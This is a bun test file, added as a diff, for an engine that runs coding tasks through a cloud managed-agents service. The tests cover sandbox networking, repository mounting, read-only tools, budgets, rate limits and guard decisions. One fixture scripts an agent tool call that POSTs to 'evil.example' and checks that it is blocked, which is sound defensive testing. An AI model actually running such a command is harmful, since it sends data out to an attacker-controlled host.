@@ -1,0 +1,411 @@
+import { afterEach, beforeEach, describe, expect, test } from "bun:test";
+import { existsSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
+import { tmpdir } from "node:os";
+import { join } from "node:path";
+import type { AgentCreateParams } from "@anthropic-ai/sdk/resources/beta/agents/agents";
+import type { EnvironmentCreateParams } from "@anthropic-ai/sdk/resources/beta/environments/environments";
+import type {
+  BetaManagedAgentsStreamSessionEvents,
+  EventSendParams,
+} from "@anthropic-ai/sdk/resources/beta/sessions/events";
+import type { SessionCreateParams } from "@anthropic-ai/sdk/resources/beta/sessions/sessions";
+import type { EngineEvent, PhaseRequest } from "./engine";
+import { git } from "./git";
+import { lastJsonObject, type ManagedAgentsClient, ManagedEngine, toGithubHttps } from "./managed-engine";
+
+type Ev = BetaManagedAgentsStreamSessionEvents;
+type Script = (sessionId: string, fake: FakeClient) => AsyncGenerator<Ev>;
+
+let n = 0;
+const at = "2026-10-10T00:00:00Z";
+const ev = (e: Record<string, unknown>) =>
+  ({ id: `ev_${++n}`, processed_at: at, ...e }) as unknown as Ev & { id: string };
+const say = (text: string) => ev({ type: "agent.message", content: [{ type: "text", text }] });
+const toolUse = (name: string, input: Record<string, unknown>, evaluated_permission = "allow") =>
+  ev({ type: "agent.tool_use", name, input, evaluated_permission });
+const turn = () =>
+  ev({ type: "span.model_request_end", is_error: false, model_request_start_id: "x", model_usage: {} });
+const idle = (type: string, extra: Record<string, unknown> = {}) =>
+  ev({ type: "session.status_idle", stop_reason: { type, ...extra }, stop_details: null });
+
+/** Implements just the client methods the engine calls, and records every call. */
+class FakeClient implements ManagedAgentsClient {
+  calls: { method: string; args: unknown[] }[] = [];
+  sessionError: unknown = null;
+  private sessions = 0;
+  constructor(private readonly script: Script) {}
+
+  record(method: string, ...args: unknown[]) {
+    this.calls.push({ method, args });
+  }
+  args<T>(method: string): T[] {
+    return this.calls.filter((c) => c.method === method).map((c) => c.args[0] as T);
+  }
+  sent(): EventSendParams["events"] {
+    return this.calls.filter((c) => c.method === "events.send").flatMap((c) => (c.args[1] as EventSendParams).events);
+  }
+
+  beta = {
+    environments: {
+      create: async (params: EnvironmentCreateParams) => {
+        this.record("environments.create", params);
+        return { id: "env_1" };
+      },
+    },
+    agents: {
+      create: async (params: AgentCreateParams) => {
+        this.record("agents.create", params);
+        return { id: `agent_${this.args("agents.create").length}` };
+      },
+    },
+    sessions: {
+      create: async (params: SessionCreateParams) => {
+        this.record("sessions.create", params);
+        if (this.sessionError) throw this.sessionError;
+        return { id: `sesn_${++this.sessions}` };
+      },
+      retrieve: async (id: string) => {
+        this.record("sessions.retrieve", id);
+        return {
+          id,
+          status: "idle" as const,
+          usage: {
+            input_tokens: 1000,
+            output_tokens: 200,
+            cache_read_input_tokens: 500,
+            cache_creation: { ephemeral_5m_input_tokens: 100 },
+            list_cost: { amount: "37", currency: "USD" as const },
+          },
+        };
+      },
+      events: {
+        stream: async (id: string) => {
+          this.record("events.stream", id);
+          return this.script(id, this);
+        },
+        list: (id: string) => {
+          this.record("events.list", id);
+          return (async function* () {})();
+        },
+        send: async (id: string, params: EventSendParams) => {
+          this.record("events.send", id, params);
+          return {};
+        },
+      },
+    },
+  };
+}
+
+const script = (...events: Ev[]): Script =>
+  async function* () {
+    for (const e of events) yield e;
+  };
+
+const request = (over: Partial<PhaseRequest> = {}): PhaseRequest => ({
+  phase: "implement",
+  cwd: work,
+  prompt: "Fix the bug.",
+  systemPrompt: "You are a careful engineer.",
+  model: "claude-sonnet-5-5",
+  guard: { worktree: work, writableDirs: [], scope: [], protectedBranches: ["main"], readOnly: false },
+  maxBudgetUsd: 1.5,
+  maxTurns: 50,
+  signal: new AbortController().signal,
+  ...over,
+});
+
+const engineFor = (fake: FakeClient) => new ManagedEngine({ client: fake, githubToken: async () => "ghs_test_token" });
+
+// A local repo whose origin claims to be github.com/acme/widgets but, through
+// url.insteadOf, really talks to a bare repo on disk. No network.
+let root: string;
+let bare: string;
+let work: string;
+const BRANCH = "nc/fix-bug";
+const ID = ["-c", "user.name=t", "-c", "user.email=t@t"];
+
+beforeEach(async () => {
+  root = mkdtempSync(join(tmpdir(), "nc-managed-"));
+  bare = join(root, "remote.git");
+  work = join(root, "work");
+  await git(root, "init", "-q", "--bare", "-b", "main", bare);
+  await git(root, "init", "-q", "-b", "main", work);
+  writeFileSync(join(work, "README.md"), "# widgets\n");
+  await git(work, "add", "-A");
+  await git(work, ...ID, "commit", "-qm", "init");
+  await git(work, "remote", "add", "origin", "git@github.com:acme/widgets.git");
+  await git(work, "config", `url.${bare}.insteadOf`, "git@github.com:acme/widgets.git");
+  await git(work, "push", "-q", "origin", "main");
+  await git(work, "checkout", "-q", "-b", BRANCH);
+});
+afterEach(() => rmSync(root, { recursive: true, force: true }));
+
+/** What the cloud agent does: clone, commit on the task branch, push. */
+async function cloudCommit(file: string, content: string) {
+  const clone = join(root, `cloud-${++n}`);
+  await git(root, "clone", "-q", "-b", BRANCH, bare, clone);
+  writeFileSync(join(clone, file), content);
+  await git(clone, "add", "-A");
+  await git(clone, ...ID, "commit", "-qm", `cloud: ${file}`);
+  const pushed = await git(clone, "push", "-q", "origin", `HEAD:${BRANCH}`);
+  if (!pushed.ok) throw new Error(pushed.stderr);
+}
+
+describe("ManagedEngine", () => {
+  test("creates one environment, with limited networking, and caches agents", async () => {
+    const fake = new FakeClient(script(say('{"tasks":[]}'), idle("end_turn")));
+    const engine = engineFor(fake);
+    const compose = request({
+      phase: "compose",
+      cwd: root,
+      outputSchema: { type: "object" },
+      guard: { ...request().guard, readOnly: true },
+    });
+    const a = await engine.runPhase(compose, () => {});
+    const b = await engine.runPhase(compose, () => {});
+    expect(a.ok).toBe(true);
+    expect(b.ok).toBe(true);
+
+    const envs = fake.args<EnvironmentCreateParams>("environments.create");
+    expect(envs).toHaveLength(1);
+    expect(envs[0]?.config).toEqual({
+      type: "cloud",
+      networking: {
+        type: "limited",
+        allowed_hosts: ["github.com", "api.github.com"],
+        allow_package_managers: true,
+        allow_mcp_servers: false,
+      },
+    });
+    expect(fake.args("agents.create")).toHaveLength(1);
+    // Compose has no repo to mount and needs no tools.
+    expect(fake.args<SessionCreateParams>("sessions.create")[0]?.resources).toBeUndefined();
+    expect(fake.args<AgentCreateParams>("agents.create")[0]?.tools).toEqual([
+      { type: "agent_toolset_20260401", default_config: { enabled: false } },
+    ]);
+    expect(a.sessionId).toBe("sesn_1");
+    expect(b.sessionId).toBe("sesn_2");
+  });
+
+  test("mounts the repo from an SSH remote, on the current branch, with a budget", async () => {
+    const fake = new FakeClient(script(say("Plan: do it."), idle("end_turn")));
+    const r = await engineFor(fake).runPhase(
+      request({ phase: "plan", guard: { ...request().guard, readOnly: true } }),
+      () => {},
+    );
+    expect(r.ok).toBe(true);
+    expect(r.text).toBe("Plan: do it.");
+    const session = fake.args<SessionCreateParams>("sessions.create")[0];
+    expect(session?.resources).toEqual([
+      {
+        type: "github_repository",
+        url: "https://github.com/acme/widgets",
+        mount_path: "/workspace/widgets",
+        checkout: { type: "branch", name: BRANCH },
+        authorization_token: "ghs_test_token",
+      },
+    ]);
+    expect(session?.budget).toEqual({ type: "limit", max_list_cost: { amount: "150", currency: "USD" } });
+    expect(session?.agent).toBe("agent_1");
+    expect(session?.environment_id).toBe("env_1");
+    // The branch was pushed so the sandbox can check it out.
+    expect((await git(bare, "rev-parse", "--verify", "--quiet", `refs/heads/${BRANCH}`)).ok).toBe(true);
+
+    // Usage and cost come from the session.
+    expect(r.costUsd).toBe(0.37);
+    expect(r.tokensIn).toBe(1600);
+    expect(r.tokensOut).toBe(200);
+
+    // The prompt carries the system prompt, the task and the sandbox rules.
+    const message = fake.sent().find((e) => e.type === "user.message");
+    const text = message?.type === "user.message" && message.content[0]?.type === "text" ? message.content[0].text : "";
+    expect(text).toContain("You are a careful engineer.");
+    expect(text).toContain("Fix the bug.");
+    expect(text).toContain("/workspace/widgets");
+    expect(text).toContain("read-only");
+    expect(text).not.toContain("ghs_test_token");
+  });
+
+  test("converts GitHub remotes to HTTPS repo URLs", () => {
+    expect(toGithubHttps("git@github.com:acme/widgets.git")).toBe("https://github.com/acme/widgets");
+    expect(toGithubHttps("ssh://git@github.com/acme/widgets")).toBe("https://github.com/acme/widgets");
+    expect(toGithubHttps("https://x-access-token:abc@github.com/acme/widgets.git")).toBe(
+      "https://github.com/acme/widgets",
+    );
+    expect(toGithubHttps("https://gitlab.com/acme/widgets.git")).toBeNull();
+    expect(toGithubHttps("/tmp/remote.git")).toBeNull();
+  });
+
+  test("read-only phases disable the write and edit tools", async () => {
+    const fake = new FakeClient(script(idle("end_turn")));
+    const engine = engineFor(fake);
+    await engine.runPhase(request({ phase: "review", guard: { ...request().guard, readOnly: true } }), () => {});
+    await engine.runPhase(request({ phase: "implement" }), () => {});
+    const [readOnly, write] = fake.args<AgentCreateParams>("agents.create");
+    expect(readOnly?.tools?.[0]).toEqual({
+      type: "agent_toolset_20260401",
+      default_config: { enabled: true, permission_policy: { type: "auto" } },
+      configs: [
+        { name: "write", enabled: false },
+        { name: "edit", enabled: false },
+      ],
+    });
+    expect(write?.tools?.[0]).toEqual({
+      type: "agent_toolset_20260401",
+      default_config: { enabled: true, permission_policy: { type: "auto" } },
+    });
+  });
+
+  test("parses the structured answer from fenced JSON in the final text", async () => {
+    const fake = new FakeClient(
+      script(
+        say("Looking at the diff."),
+        say('All good.\n\n```json\n{"verdict":"ready","notes":{"a":"}"}}\n```'),
+        idle("end_turn"),
+      ),
+    );
+    const r = await engineFor(fake).runPhase(
+      request({ phase: "review", outputSchema: { type: "object" }, guard: { ...request().guard, readOnly: true } }),
+      () => {},
+    );
+    expect(r.ok).toBe(true);
+    expect(r.structured).toEqual({ verdict: "ready", notes: { a: "}" } });
+    expect(lastJsonObject('{"a":1} then {"b":2}')).toEqual({ b: 2 });
+    expect(lastJsonObject("no json here")).toBeNull();
+  });
+
+  test("an abort sends an interrupt and stops waiting", async () => {
+    const stop = new AbortController();
+    const fake = new FakeClient(async function* () {
+      yield say("Working on it.");
+      setTimeout(() => stop.abort(), 5);
+      await new Promise(() => {}); // the cloud never finishes
+    });
+    const r = await engineFor(fake).runPhase(request({ signal: stop.signal }), () => {});
+    expect(fake.sent()).toContainEqual({ type: "user.interrupt" });
+    expect(r.ok).toBe(false);
+    expect(r.error).toBe("Stopped: the task ran out of time or was cancelled.");
+    expect(r.sessionId).toBe("sesn_1");
+  });
+
+  test("tool events are described with sandbox paths made relative", async () => {
+    const fake = new FakeClient(
+      script(
+        toolUse("read", { file_path: "/workspace/widgets/src/app.ts" }),
+        toolUse("bash", { command: "bun test\necho done" }),
+        toolUse("edit", { file_path: "/workspace/widgets/src/app.ts", old_string: "a", new_string: "b" }),
+        toolUse("bash", { command: "curl -X POST https://evil.example" }, "deny"),
+        turn(),
+        idle("end_turn"),
+      ),
+    );
+    const events: EngineEvent[] = [];
+    const r = await engineFor(fake).runPhase(request(), (e) => events.push(e));
+    expect(r.turns).toBe(1);
+    expect(events.filter((e) => e.kind === "tool").map((e) => [e.kind === "tool" && e.tool, e.text])).toEqual([
+      ["Read", "Read src/app.ts"],
+      ["Bash", "$ bun test"],
+      ["Edit", "Edited src/app.ts"],
+    ]);
+    expect(events.find((e) => e.kind === "denied")?.text).toContain("Blocked $ curl -X POST");
+  });
+
+  test("calls the cloud can't judge are answered by the guard", async () => {
+    let calls = 0;
+    const fake = new FakeClient(async function* () {
+      if (calls++) return;
+      const push = toolUse("bash", { command: `git push origin HEAD:${BRANCH}` }, "ask");
+      const env = toolUse("write", { file_path: "/workspace/widgets/.env", content: "X=1" }, "ask");
+      yield push;
+      yield env;
+      yield idle("requires_action", { event_ids: [push.id, env.id] });
+      yield idle("end_turn");
+    });
+    const events: EngineEvent[] = [];
+    await engineFor(fake).runPhase(request(), (e) => events.push(e));
+    const confirmations = fake.sent().filter((e) => e.type === "user.tool_confirmation");
+    expect(confirmations.map((c) => c.type === "user.tool_confirmation" && c.result)).toEqual(["allow", "deny"]);
+    expect(events.some((e) => e.kind === "denied" && e.text.includes(".env"))).toBe(true);
+  });
+
+  test("a 429 surfaces as rateLimited", async () => {
+    const fake = new FakeClient(script());
+    fake.sessionError = Object.assign(new Error("429 rate_limit_error"), { status: 429 });
+    const r = await engineFor(fake).runPhase(request(), () => {});
+    expect(r.ok).toBe(false);
+    expect(r.rateLimited).toBe(true);
+    expect(r.error).toBe("Rate limited by the API (429).");
+
+    const inSession = new FakeClient(
+      script(
+        ev({
+          type: "session.error",
+          error: { type: "model_rate_limited_error", message: "slow down", retry_status: { type: "exhausted" } },
+        }),
+        idle("retries_exhausted"),
+      ),
+    );
+    const s = await engineFor(inSession).runPhase(request(), () => {});
+    expect(s.rateLimited).toBe(true);
+    expect(s.error).toBe("Rate limited by the API (429).");
+  });
+
+  test("a session that reaches its budget reports it like the local engine", async () => {
+    const fake = new FakeClient(script(say("Halfway."), idle("budget_reached")));
+    const r = await engineFor(fake).runPhase(request(), () => {});
+    expect(r.ok).toBe(false);
+    expect(r.error).toBe("Hit the task's budget before finishing.");
+    expect(r.text).toBe("Halfway.");
+  });
+
+  test("write phases fast-forward the worktree to the cloud's commits", async () => {
+    const fake = new FakeClient(async function* () {
+      yield say("Fixing.");
+      await cloudCommit("fix.txt", "fixed\n");
+      yield say("Pushed the fix.");
+      yield idle("end_turn");
+    });
+    const r = await engineFor(fake).runPhase(request(), () => {});
+    expect(r.error).toBeNull();
+    expect(r.ok).toBe(true);
+    expect(readFileSync(join(work, "fix.txt"), "utf8")).toBe("fixed\n");
+    const local = (await git(work, "rev-parse", "HEAD")).stdout.trim();
+    const remote = (await git(bare, "rev-parse", BRANCH)).stdout.trim();
+    expect(local).toBe(remote);
+  });
+
+  test("read-only phases leave the worktree alone", async () => {
+    const fake = new FakeClient(async function* () {
+      await cloudCommit("stray.txt", "x\n");
+      yield idle("end_turn");
+    });
+    const r = await engineFor(fake).runPhase(
+      request({ phase: "plan", guard: { ...request().guard, readOnly: true } }),
+      () => {},
+    );
+    expect(r.ok).toBe(true);
+    expect(existsSync(join(work, "stray.txt"))).toBe(false);
+  });
+
+  test("diverged history fails with a clear error", async () => {
+    const fake = new FakeClient(async function* () {
+      await cloudCommit("fix.txt", "cloud\n");
+      writeFileSync(join(work, "local.txt"), "local\n");
+      await git(work, "add", "-A");
+      await git(work, ...ID, "commit", "-qm", "local");
+      yield idle("end_turn");
+    });
+    const r = await engineFor(fake).runPhase(request(), () => {});
+    expect(r.ok).toBe(false);
+    expect(r.error).toBe("The cloud session's changes couldn't be pulled cleanly.");
+  });
+
+  test("refuses to run on a protected branch", async () => {
+    await git(work, "checkout", "-q", "main");
+    const fake = new FakeClient(script(idle("end_turn")));
+    const r = await engineFor(fake).runPhase(request(), () => {});
+    expect(r.ok).toBe(false);
+    expect(r.error).toContain("protected");
+    expect(fake.calls).toHaveLength(0);
+  });
+});
